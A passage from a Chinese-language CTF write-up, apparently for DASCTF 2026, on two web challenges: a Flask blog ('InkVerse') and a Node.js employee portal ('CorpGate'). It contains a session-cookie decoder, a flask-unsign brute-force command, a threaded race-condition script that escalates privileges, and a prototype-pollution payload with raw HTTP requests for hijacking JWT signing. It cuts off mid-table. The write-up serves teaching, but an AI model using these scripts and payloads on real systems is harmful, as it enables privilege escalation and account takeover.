+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64, zlib, json<br><br>cookie = <span class="hljs-string">&quot;eJyrVirKz0lVslIqLU4tUtIBU_GZKUpWRhB2XmIuSLYktbhEqRYAVoIPAQ.ahvFvg.oN3C0lWq0WfCjlCeXdkQdKr5OEA&quot;</span><br>payload = cookie.split(<span class="hljs-string">&#x27;.&#x27;</span>)[<span class="hljs-number">0</span>]<br>payload_std = payload.replace(<span class="hljs-string">&#x27;-&#x27;</span>, <span class="hljs-string">&#x27;+&#x27;</span>).replace(<span class="hljs-string">&#x27;_&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>)<br>payload_std += <span class="hljs-string">&#x27;=&#x27;</span> * (<span class="hljs-number">4</span> - <span class="hljs-built_in">len</span>(payload_std) % <span class="hljs-number">4</span>)<br>data = json.loads(zlib.decompress(base64.b64decode(payload_std)))<br><span class="hljs-built_in">print</span>(data)<br><span class="hljs-comment"># &#123;&#x27;role&#x27;: &#x27;user&#x27;, &#x27;user_id&#x27;: 2, &#x27;username&#x27;: &#x27;test&#x27;&#125;</span><br></code></pre></td></tr></table></figure>
+
+<p>尝试伪造<code>user_id</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">pip install flask-unsign<br>flask-unsign --unsign --cookie <span class="hljs-string">&quot;.eJyrVirKz0lVslIqLU4tUtIBU_GZKUpWRhB2XmIuSLYktbhEqRYAVoIPAQ.ahvFvg.oN3C0lWq0WfCjlCeXdkQdKr5OEA&quot;</span> --wordlist rockyou.txt --no-literal-<span class="hljs-built_in">eval</span><br></code></pre></td></tr></table></figure>
+
+<p>使用rockyou字典爆破，均未成功。密钥强度足够，此路不通。</p>
+<p>测试文章flask SSTI</p>
+<p><img src="/mdimg/2026DASCTF/1780206273311-b837da51-064c-433a-a369-82b656dc3fec.png" srcset="/img/loading.gif" lazyload></p>
+<p>用户名处也没有</p>
+<p><img src="/mdimg/2026DASCTF/1780206335774-a48e92fa-13ca-48a9-b3f7-89398d7254f1.png" srcset="/img/loading.gif" lazyload></p>
+<p>正常打赏流程：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plain">1. 检查余额 &gt;= 10<br>2. 扣除余额 (balance -= 10)<br>3. 增加声望 (reputation += 2)<br>4. 检查声望 &gt;= 50 → 晋升 reviewer<br></code></pre></td></tr></table></figure>
+
+<p><strong>问题</strong>：步骤 1 的余额检查和步骤 2 的余额扣除之间存在 <strong>TOCTOU (Time-of-Check-Time-of-Use)</strong> 竞态窗口。如果同时发送多个请求，所有请求可能在余额扣除前都通过了检查。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> concurrent.futures<br><br>BASE = <span class="hljs-string">&quot;http://ca62fb0b.http-ctf2.dasctf.com&quot;</span><br>session = requests.Session()<br><br><span class="hljs-comment"># 登录</span><br>session.post(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;BASE&#125;</span>/login&quot;</span>, data=&#123;<span class="hljs-string">&quot;username&quot;</span>: <span class="hljs-string">&quot;test&quot;</span>, <span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">&quot;test&quot;</span>&#125;)<br><br><span class="hljs-comment"># 查看当前状态</span><br>info = session.get(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;BASE&#125;</span>/api/user/info&quot;</span>).json()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[*] 当前: balance=<span class="hljs-subst">&#123;info[<span class="hljs-string">&#x27;balance&#x27;</span>]&#125;</span>, rep=<span class="hljs-subst">&#123;info[<span class="hljs-string">&#x27;reputation&#x27;</span>]&#125;</span>, role=<span class="hljs-subst">&#123;info[<span class="hljs-string">&#x27;role&#x27;</span>]&#125;</span>&quot;</span>)<br><br><span class="hljs-comment"># 竞态条件攻击</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">tip</span>(<span class="hljs-params">_</span>):<br>    <span class="hljs-keyword">try</span>:<br>        r = session.post(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;BASE&#125;</span>/api/tip&quot;</span>, json=&#123;<span class="hljs-string">&quot;article_id&quot;</span>: <span class="hljs-number">1</span>&#125;, timeout=<span class="hljs-number">5</span>)<br>        <span class="hljs-keyword">return</span> r.json()<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] 发送并发打赏请求...&quot;</span>)<br><span class="hljs-keyword">with</span> concurrent.futures.ThreadPoolExecutor(max_workers=<span class="hljs-number">30</span>) <span class="hljs-keyword">as</span> executor:<br>    results = <span class="hljs-built_in">list</span>(executor.<span class="hljs-built_in">map</span>(tip, <span class="hljs-built_in">range</span>(<span class="hljs-number">30</span>)))<br><br><span class="hljs-comment"># 检查结果</span><br>info = session.get(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;BASE&#125;</span>/api/user/info&quot;</span>).json()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[*] 攻击后: balance=<span class="hljs-subst">&#123;info[<span class="hljs-string">&#x27;balance&#x27;</span>]&#125;</span>, rep=<span class="hljs-subst">&#123;info[<span class="hljs-string">&#x27;reputation&#x27;</span>]&#125;</span>, role=<span class="hljs-subst">&#123;info[<span class="hljs-string">&#x27;role&#x27;</span>]&#125;</span>&quot;</span>)<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">[*] 当前: balance=190, rep=2, role=user</span><br><span class="hljs-string">[*] 发送并发打赏请求...</span><br><span class="hljs-string">[*] 攻击后: balance=-110, rep=62, role=reviewer</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>并发请求全部在余额扣除前通过了 <code>balance &gt;= 10</code> 检查</li>
+<li>30 个请求 × 2 声望 = 60 声望（超过 50 的 reviewer 阈值）</li>
+<li>余额变为 -100（透支），但声望已经足够</li>
+<li>系统自动将角色从 <code>user</code> 晋升为 <code>reviewer</code></li>
+</ul>
+<p>再次访问/bulletin</p>
+<p><img src="/mdimg/2026DASCTF/1780207255751-44ba10cf-e6bc-4d73-8de6-efbe6b8ab237.png" srcset="/img/loading.gif" lazyload></p>
+<table>
+<thead>
+<tr>
+<th>角色</th>
+<th>权限</th>
+<th>获取方式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>user</code></td>
+<td>创建文章、打赏、查看公告(public)</td>
+<td>注册即获得</td>
+</tr>
+<tr>
+<td><code>reviewer</code></td>
+<td>审核文章、导出文章、查看审核面板</td>
+<td>声望 ≥ 50 自动晋升</td>
+</tr>
+<tr>
+<td><code>admin</code></td>
+<td>管理员权限、导入文章、晋升用户</td>
+<td>仅限 user_id=1</td>
+</tr>
+<tr>
+<td><code>featured_author</code></td>
+<td>查看分级公告中的特殊内容</td>
+<td>文章被精选后获得</td>
+</tr>
+</tbody></table>
+<p>查看api文档中有文章导出接口</p>
+<p><img src="/mdimg/2026DASCTF/1780206935073-09f02290-66ce-4a51-948e-6fd9ee21ecfb.png" srcset="/img/loading.gif" lazyload></p>
+<p>查看任务状态</p>
+<p><img src="/mdimg/2026DASCTF/1780206989819-8db39ef5-bf12-4b2f-8830-40d5d1b9d2ad.png" srcset="/img/loading.gif" lazyload></p>
+<p>下载文件</p>
+<p><img src="/mdimg/2026DASCTF/1780207108410-e87901fd-317c-4439-88db-c8dd2e843c9a.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">Title: Welcome to InkVerse<br>Author: admin<br>Export-ID: <span class="hljs-number">1</span><br>Processed-At: <span class="hljs-number">2026</span>-05-<span class="hljs-number">31</span> 05:<span class="hljs-number">54</span>:<span class="hljs-number">59</span><br>Integrity: a606867c38f1d10f4bf4f6480cad8c83<br>Feature-Token: e62984cc48ce4899f075b7215ebfadbde86b3b6c6b1b412bed325d32478fdf4b<br>---<br>This <span class="hljs-keyword">is</span> the official blog platform. Share your stories <span class="hljs-keyword">with</span> the world!<br></code></pre></td></tr></table></figure>
+
+<p>得到Feature-Token</p>
+<p>文章要经过/review才能公开，但是不能审核自己的文章，所以要注册另一个账户通过toctou提权到reviewer然后审核通过</p>
+<p>Feature-Token是根据文章动态生成的，每个文章不同，所以要导出自己的文章</p>
+<p><img src="/mdimg/2026DASCTF/1780210069557-75a201ac-e27a-409c-b67f-a4bea69e5879.png" srcset="/img/loading.gif" lazyload></p>
+<p>用Feature-Token将自己的文章精选，则权限提升至<code>featured_author</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python">POST /api/review/feature HTTP/<span class="hljs-number">1.1</span><br>Host: 5481fa2c.http-ctf2.dasctf.com<br>Accept-Encoding: gzip, deflate<br>Accept-Language: zh-CN,zh;q=<span class="hljs-number">0.9</span><br>Cookie: session=eyJyb2xlIjoicmV2aWV3ZXIiLCJ1c2VyX2lkIjoyLCJ1c2VybmFtZSI6InRlc3QifQ.ahvTMg.-TncZmkf0KSei7FlxptrBi-QY3A<br>Upgrade-Insecure-Requests: <span class="hljs-number">1</span><br>User-Agent: Mozilla/<span class="hljs-number">5.0</span> (Windows NT <span class="hljs-number">10.0</span>; Win64; x64) AppleWebKit/<span class="hljs-number">537.36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">148.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span> Safari/<span class="hljs-number">537.36</span><br>Accept: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0.9</span>,image/avif,image/webp,image/apng,*/*;q=<span class="hljs-number">0.8</span>,application/signed-exchange;v=b3;q=<span class="hljs-number">0.7</span><br>Referer: http://5481fa2c.http-ctf2.dasctf.com/review<br>Content-<span class="hljs-type">Type</span>: application/json<br>Feature-Token: a86d57d985ee4b22c67cf13d662ae1ce22bc65a6909d08d951002eed858d0308<br><br>&#123;<span class="hljs-string">&quot;article_id&quot;</span>:<span class="hljs-number">9</span>,<span class="hljs-string">&quot;signature&quot;</span>:<span class="hljs-string">&quot;a86d57d985ee4b22c67cf13d662ae1ce22bc65a6909d08d951002eed858d0308&quot;</span>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/mdimg/2026DASCTF/1780210404285-2c1f982c-a008-456a-9199-efa6d08a51ed.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/mdimg/2026DASCTF/1780210386341-11809841-d009-42b4-9407-ebed3ecc3eac.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="CorpGate"><a href="#CorpGate" class="headerlink" title="CorpGate"></a>CorpGate</h3><p><strong>技术栈</strong>: Node.js + Express + EJS + JWT + Cookie Auth</p>
+<p>CorpGate 是一套企业员工门户系统，主要模块包括：</p>
+<table>
+<thead>
+<tr>
+<th>路由文件</th>
+<th>功能</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>routes/auth.js</code></td>
+<td>用户注册、登录、登出</td>
+</tr>
+<tr>
+<td><code>routes/user.js</code></td>
+<td>Dashboard、通讯录、设置、搜索、健康检查</td>
+</tr>
+<tr>
+<td><code>routes/admin.js</code></td>
+<td>管理面板（需要 admin 角色）、诊断令牌生成</td>
+</tr>
+<tr>
+<td><code>routes/diagnostic.js</code></td>
+<td>诊断报告执行（运行 <code>/readflag</code>）</td>
+</tr>
+</tbody></table>
+<h4 id="漏洞一：deepMerge-原型链污染（Prototype-Pollution）"><a href="#漏洞一：deepMerge-原型链污染（Prototype-Pollution）" class="headerlink" title="漏洞一：deepMerge 原型链污染（Prototype Pollution）"></a>漏洞一：<code>deepMerge</code> 原型链污染（Prototype Pollution）</h4><p><strong>漏洞位置</strong>: <code>utils/merge.js</code></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">BLOCKED_ROOTS</span> = [<span class="hljs-string">&#x27;__proto__&#x27;</span>, <span class="hljs-string">&#x27;__defineGetter__&#x27;</span>, <span class="hljs-string">&#x27;__defineSetter__&#x27;</span>, <span class="hljs-string">&#x27;constructor&#x27;</span>, <span class="hljs-string">&#x27;prototype&#x27;</span>];<br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">BLOCKED_KEYS</span> = [<span class="hljs-string">&#x27;__proto__&#x27;</span>, <span class="hljs-string">&#x27;__defineGetter__&#x27;</span>, <span class="hljs-string">&#x27;__defineSetter__&#x27;</span>];<br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">MAX_DEPTH</span> = <span class="hljs-number">6</span>;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">deepMerge</span>(<span class="hljs-params">target, source, depth</span>) &#123;<br>  <span class="hljs-keyword">if</span> (depth === <span class="hljs-literal">undefined</span>) depth = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">if</span> (depth &gt;= <span class="hljs-variable constant_">MAX_DEPTH</span>) <span class="hljs-keyword">return</span> target;<br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> rawKey <span class="hljs-keyword">in</span> source) &#123;<br>    <span class="hljs-keyword">var</span> key = <span class="hljs-title function_">sanitizeKey</span>(rawKey);<br>    <span class="hljs-keyword">if</span> (key === <span class="hljs-string">&#x27;&#x27;</span>) <span class="hljs-keyword">continue</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable constant_">BLOCKED_KEYS</span>.<span class="hljs-title function_">indexOf</span>(key) !== -<span class="hljs-number">1</span>) <span class="hljs-keyword">continue</span>;          <span class="hljs-comment">// ⚠️ 只阻止 __proto__ 等3个</span><br>    <span class="hljs-keyword">if</span> (depth &lt; <span class="hljs-number">3</span> &amp;&amp; <span class="hljs-variable constant_">BLOCKED_ROOTS</span>.<span class="hljs-title function_">indexOf</span>(key) !== -<span class="hljs-number">1</span>) <span class="hljs-keyword">continue</span>; <span class="hljs-comment">// ⚠️ 深度&gt;=3时放行</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_">isPlainObject</span>(source[rawKey])) &#123;<br>      <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> target[key] === <span class="hljs-string">&#x27;object&#x27;</span> &amp;&amp; target[key] !== <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-title function_">deepMerge</span>(target[key], source[rawKey], depth + <span class="hljs-number">1</span>);    <span class="hljs-comment">// ⚠️ 递归合并</span><br>      &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> target[key] === <span class="hljs-string">&#x27;function&#x27;</span>) &#123;<br>        <span class="hljs-title function_">deepMerge</span>(target[key], source[rawKey], depth + <span class="hljs-number">1</span>);    <span class="hljs-comment">// ⚠️ 函数也递归！</span><br>      &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      target[key] = source[rawKey];<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">return</span> target;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><strong>关键缺陷分析</strong>:</p>
+<ol>
+<li><code>BLOCKED_KEYS</code>** 过滤不全**: <code>constructor</code> 和 <code>prototype</code> 不在 <code>BLOCKED_KEYS</code> 中，只在 <code>BLOCKED_ROOTS</code> 中</li>
+<li><strong>深度限制可绕过</strong>: <code>BLOCKED_ROOTS</code> 的检查条件是 <code>depth &lt; 3</code>，当 <code>depth &gt;= 3</code> 时，<code>constructor</code>、<code>prototype</code> 等危险键名不再被阻止</li>
+<li><strong>函数类型也可递归</strong>: 当 <code>target[key]</code> 是函数时（如构造函数），代码仍然递归进入合并</li>
+</ol>
+<h4 id="漏洞二：JWT-签名密钥可被外部轮换"><a href="#漏洞二：JWT-签名密钥可被外部轮换" class="headerlink" title="漏洞二：JWT 签名密钥可被外部轮换"></a>漏洞二：JWT 签名密钥可被外部轮换</h4><p><strong>漏洞位置</strong>: <code>config.js</code> + <code>routes/user.js</code></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// config.js - configRefresh 函数</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">configRefresh</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">var</span> rotation = &#123;&#125;;           <span class="hljs-comment">// 空对象，继承 Object.prototype</span><br>  rotation.<span class="hljs-property">source</span> = <span class="hljs-string">&#x27;vault&#x27;</span>;<br>  rotation.<span class="hljs-property">timestamp</span> = <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>();<br><br>  <span class="hljs-keyword">if</span> (rotation.<span class="hljs-property">pending</span>) &#123;      <span class="hljs-comment">// ⚠️ 如果 Object.prototype.pending 被污染，这里为 true</span><br>    signingState.<span class="hljs-property">active</span> = rotation.<span class="hljs-property">pending</span>;  <span class="hljs-comment">// ⚠️ 签名密钥被替换为攻击者控制的值</span><br>    signingState.<span class="hljs-property">version</span>++;<br>    <span class="hljs-keyword">return</span> &#123; <span class="hljs-attr">rotated</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">version</span>: signingState.<span class="hljs-property">version</span> &#125;;<br>  &#125;<br>  <span class="hljs-keyword">return</span> &#123; <span class="hljs-attr">rotated</span>: <span class="hljs-literal">false</span>, <span class="hljs-attr">version</span>: signingState.<span class="hljs-property">version</span> &#125;;<br>&#125;<br><br><span class="hljs-comment">// routes/user.js - 健康检查端点，无需认证！</span><br>router.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/api/system/healthcheck&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">var</span> result = config.<span class="hljs-title function_">configRefresh</span>();    <span class="hljs-comment">// ⚠️ 任何人都能触发密钥轮换</span><br>  res.<span class="hljs-title function_">json</span>(&#123; ... &#125;);<br>&#125;);<br></code></pre></td></tr></table></figure>
+
+<h4 id="漏洞三：诊断端点执行系统命令"><a href="#漏洞三：诊断端点执行系统命令" class="headerlink" title="漏洞三：诊断端点执行系统命令"></a>漏洞三：诊断端点执行系统命令</h4><p><strong>漏洞位置</strong>: <code>routes/diagnostic.js</code></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs javascript">router.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/api/reports/execute&#x27;</span>, authMiddleware, adminMiddleware, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-comment">// 需要 admin 角色 + 有效的一次性 reference token</span><br>  <span class="hljs-keyword">var</span> entry = config.<span class="hljs-property">diagnosticStore</span>[ref];<br>  <span class="hljs-comment">// ... TTL 和一次性检查 ...</span><br>  entry.<span class="hljs-property">consumed</span> = <span class="hljs-literal">true</span>;<br>  <span class="hljs-keyword">var</span> output = <span class="hljs-string">&#x27;Diagnostic failed&#x27;</span>;<br>  <span class="hljs-keyword">try</span> &#123;<br>    output = <span class="hljs-title function_">execSync</span>(<span class="hljs-string">&#x27;/readflag&#x27;</span>).<span class="hljs-title function_">toString</span>().<span class="hljs-title function_">trim</span>();  <span class="hljs-comment">// ⚠️ 直接执行 /readflag</span><br>  &#125; <span class="hljs-keyword">catch</span> (e) &#123;&#125;<br>  res.<span class="hljs-title function_">json</span>(&#123; <span class="hljs-attr">status</span>: <span class="hljs-string">&#x27;completed&#x27;</span>, <span class="hljs-attr">report</span>: output &#125;);<br>&#125;);<br></code></pre></td></tr></table></figure>
+
+<h4 id="攻击链验证"><a href="#攻击链验证" class="headerlink" title="攻击链验证"></a>攻击链验证</h4><p>Step 1：注册用户</p>
+<p>服务器返回 <code>302</code> 重定向到 <code>/dashboard</code>，并在 <code>Set-Cookie</code> 中返回 JWT token：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6ImY0YjU2ODNkLTEwZTktNDk0Ni05YmE4LTQ2MWJmOTZkNzQzZCIsInVzZXJuYW1lIjoidGVzdCIsInJvbGUiOiJlbXBsb3llZSIsImlhdCI6MTc4MDIxMTcyMSwiZXhwIjoxNzgwMjk4MTIxfQ.cXiFGQLQwxJ7YCFME8yQWTbNHLHCt6IhJoLeynIOw_Q<br></code></pre></td></tr></table></figure>
+
+<p>Step 2：触发原型链污染</p>
+<p>利用 <code>POST /api/settings</code> 的 <code>deepMerge</code> 漏洞。请求体结构经过精心设计：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;notifications&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span>          <span class="hljs-comment">// depth 0 → 递归进入</span><br>    <span class="hljs-attr">&quot;digest&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span>               <span class="hljs-comment">// depth 1 → 递归进入</span><br>      <span class="hljs-attr">&quot;channels&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span>           <span class="hljs-comment">// depth 2 → 递归进入（target 是 settings.notifications.digest.channels 对象）</span><br>        <span class="hljs-attr">&quot;constructor&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span>      <span class="hljs-comment">// depth 3 → 通过！（BLOCKED_ROOTS 检查 depth &lt; 3 为 false）</span><br>          <span class="hljs-attr">&quot;prototype&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span>      <span class="hljs-comment">// depth 4 → 通过！（同上）</span><br>            <span class="hljs-attr">&quot;pending&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;passwd&quot;</span>  <span class="hljs-comment">// depth 5 → 写入 Object.prototype.pending</span><br>          <span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">&#125;</span><br>      <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span><br>  <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs json">POST /api/settings HTTP/<span class="hljs-number">1.1</span><br>Host<span class="hljs-punctuation">:</span> <span class="hljs-number">686</span>d3db8.http-ctf2.dasctf.com<br>User-Agent<span class="hljs-punctuation">:</span> Mozilla/<span class="hljs-number">5.0</span> (Windows NT <span class="hljs-number">10.0</span>; Win64; x64) AppleWebKit/<span class="hljs-number">537.36</span> (KHTML<span class="hljs-punctuation">,</span> like Gecko) Chrome/<span class="hljs-number">148.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span> Safari/<span class="hljs-number">537.36</span><br>Cache-Control<span class="hljs-punctuation">:</span> max-age=<span class="hljs-number">0</span><br>Upgrade-Insecure-Requests<span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><br>Accept<span class="hljs-punctuation">:</span> text/html<span class="hljs-punctuation">,</span>application/xhtml+xml<span class="hljs-punctuation">,</span>application/xml;q=<span class="hljs-number">0.9</span><span class="hljs-punctuation">,</span>image/avif<span class="hljs-punctuation">,</span>image/webp<span class="hljs-punctuation">,</span>image/apng<span class="hljs-punctuation">,</span>*<span class="hljs-comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="hljs-comment">Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6ImY0YjU2ODNkLTEwZTktNDk0Ni05YmE4LTQ2MWJmOTZkNzQzZCIsInVzZXJuYW1lIjoidGVzdCIsInJvbGUiOiJlbXBsb3llZSIsImlhdCI6MTc4MDIxMTcyMSwiZXhwIjoxNzgwMjk4MTIxfQ.cXiFGQLQwxJ7YCFME8yQWTbNHLHCt6IhJoLeynIOw_Q</span><br><span class="hljs-comment">Referer: http://686d3db8.http-ctf2.dasctf.com/register</span><br><span class="hljs-comment">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="hljs-comment">Accept-Encoding: gzip, deflate</span><br><span class="hljs-comment">Content-Type: application/json</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">&#123;</span><br><span class="hljs-comment">  &quot;notifications&quot;: &#123;          </span><br><span class="hljs-comment">    &quot;digest&quot;: &#123;               </span><br><span class="hljs-comment">      &quot;channels&quot;: &#123;           </span><br><span class="hljs-comment">        &quot;constructor&quot;: &#123;      </span><br><span class="hljs-comment">          &quot;prototype&quot;: &#123;      </span><br><span class="hljs-comment">            &quot;pending&quot;: &quot;passwd&quot;  </span><br><span class="hljs-comment">          &#125;</span><br><span class="hljs-comment">        &#125;</span><br><span class="hljs-comment">      &#125;</span><br><span class="hljs-comment">    &#125;</span><br><span class="hljs-comment">  &#125;</span><br><span class="hljs-comment">&#125;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/mdimg/2026DASCTF/1780211902463-5795ed07-9a82-45b5-be8f-7bb130953f8f.png" srcset="/img/loading.gif" lazyload></p>
+<p><strong>污染路径详解</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>深度</th>
+<th>键名</th>
+<th>BLOCKED_KEYS 检查</th>
+<th>BLOCKED_ROOTS 检查</th>
+<th>结果</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>0</td>
+<td><code>notifications</code></td>
+<td>未命中</td>
+<td>-</td>
+<td>递归进入</td>
+</tr>
+<tr>
+<td>1</td>
+<td><code>digest</code></td>
+<td>未命中</td>
+<td>-</td>
+<td>递归进入</td>
+</tr>
+<tr>
+<td>2</td>
+<td><code>channels</code></td>
+<td>未命中</td>
+<td>-</td>
+<td>递归进入</td>
+</tr>
+<tr>
+<td>3</td>
+<td><code>constructor</code></td>
+<td>未命中</td>
